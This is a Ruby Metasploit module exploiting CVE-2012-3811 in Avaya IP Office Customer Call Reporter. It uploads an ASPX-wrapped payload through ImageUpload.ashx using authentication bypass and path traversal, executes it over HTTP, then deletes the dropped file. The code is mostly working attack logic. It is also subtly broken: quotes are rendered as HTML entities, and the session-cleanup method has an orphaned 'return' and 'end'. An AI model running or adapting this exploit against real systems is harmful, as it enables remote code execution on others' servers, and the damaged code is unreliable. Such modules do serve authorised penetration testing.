# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;uri&#039;
require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize
    super(
      &#039;Name&#039;           => &#039;Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an authentication bypass vulnerability on Avaya IP Office
        Customer Call Reporter, which allows a remote user to upload arbitrary files
        through the ImageUpload.ashx component. It can be abused to upload and execute
        arbitrary ASP .NET code. The vulnerability has been tested successfully on Avaya IP
        Office Customer Call Reporter 7.0.4.2 and 8.0.8.15 on Windows 2003 SP2.
      },
      &#039;Author&#039;      =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2012-3811&#039; ],
          [ &#039;OSVDB&#039;, &#039;83399&#039; ],
          [ &#039;BID&#039;, &#039;54225&#039; ],
          [ &#039;URL&#039;, &#039;https://downloads.avaya.com/css/P8/documents/100164021&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-106/&#039; ]
        ],
      &#039;Targets&#039;     =>
        [
          [ &#039;Avaya IP Office Customer Call Reporter 7.0 and 8.0 / Microsoft Windows Server 2003 SP2&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jun 28 2012&#039;
    )

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path of the Avaya CCR applications&#039;, &#039;/&#039;])
      ], self.class)
  end

  #
  #
  def on_new_session(cli)
      return
    end

    cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")

    begin
      cli.fs.file.rm(@payload_path)
      print_good("#{@peer} - #{@payload_path} deleted")
    rescue ::Exception => e
      print_error("Unable to delete #{@payload_path}: #{e.message}")
    end
  end


  def exploit

    @peer = "#{rhost}:#{rport}"

    # Generate the ASPX containing the EXE containing the payload
    exe = generate_payload_exe
    aspx = Msf::Util::EXE.to_exe_aspx(exe)
    aspx_b64 = Rex::Text.encode_base64(aspx)

    uri_path = target_uri.path
    uri_path.path << "/" if uri_path[-1, 1] != "/"

    boundary = "---------------------------#{rand_text_alpha(36)}"

    my_data = "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"RadUAG_fileName\"\r\n"
    my_data << "\r\n"
    my_data << "#{rand_text_alpha(rand(5)+3)}.aspx\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"RadUAG_data\"\r\n"
    my_data << "\r\n"
    my_data << "#{aspx_b64}\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"RadUAG_targetFolder\"\r\n"
    my_data << "\r\n"
    my_data << "../../CCRWallboardMessageBroker/\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"RadUAG_position\"\r\n"
    my_data << "\r\n"
    my_data << "0\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"RadUAG_targetPhysicalFolder\"\r\n"
    my_data << "\r\n"
    my_data << "\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"RadUAG_overwriteExistingFiles\"\r\n"
    my_data << "\r\n"
    my_data << "True\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"RadUAG_finalFileRequest\"\r\n"
    my_data << "\r\n"
    my_data << "True\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"UploadImageType\"\r\n"
    my_data << "\r\n"
    my_data << "0\r\n"
    my_data << "--#{boundary}\r\n"
    my_data << "Content-Disposition: form-data; name=\"WallboardID\"\r\n"
    my_data << "\r\n"
    my_data << "0\r\n"
    my_data << "--#{boundary}--\r\n"

    #
    # UPLOAD
    #
    attack_url = uri_path + "CCRWebClient/Wallboard/ImageUpload.ashx"
    print_status("#{@peer} - Uploading #{aspx_b64.length} bytes through #{attack_url}...")

    res = send_request_cgi({
      &#039;uri&#039;          => attack_url,
      &#039;method&#039;       => &#039;POST&#039;,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{boundary}",
      &#039;data&#039;         => my_data,
    }, 20)

    payload_url = ""
    @payload_path = ""
    if res and res.code == 200 and res.body =~ /"Key":"RadUAG_success","Value":true/
      print_good("#{@peer} - Payload uploaded successfuly")
    else
      print_error("#{@peer} - Payload upload failed")
      return
    end

    # Retrieve info about the uploaded payload

    if res.body =~ /\{"Key":"RadUAG_filePath","Value":"(.*)"\},\{"Key":"RadUAG_associatedData/
      @payload_path = $1
      print_status("#{@peer} - Payload stored on #{@payload_path}")
    else
      print_error("#{@peer} - The payload file path couldn&#039;t be retrieved")
    end

    if res.body =~ /\[\{"Key":"UploadedImageURL","Value":"(.*)"\}\]/
      payload_url = URI($1).path
    else
      print_error("#{@peer} - The payload URI couldn&#039;t be retrieved... Aborting!")
      return
    end


    #
    # EXECUTE
    #
    print_status("#{@peer} - Executing #{payload_url}...")

    res = send_request_cgi({
      &#039;uri&#039;          =>  payload_url,
      &#039;method&#039;       => &#039;GET&#039;
    }, 20)

    if (!res or (res and res.code != 200))
      print_error("#{@peer} - Execution failed on #{payload_url} [No Response]")
      return
    end

  end

end



